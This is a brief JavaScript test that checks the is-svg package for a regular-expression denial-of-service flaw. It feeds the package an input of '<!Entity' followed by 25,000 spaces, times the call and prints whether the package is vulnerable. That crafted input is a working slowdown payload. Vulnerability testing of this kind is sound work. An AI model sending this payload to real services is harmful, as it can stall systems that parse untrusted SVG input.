// test("ReDos in is-svg", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const isSvg = require("is-svg");
  let attack_str = "<!Entity" + genstr(25000, " ");
  let t = measureTime(function () {
    isSvg(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
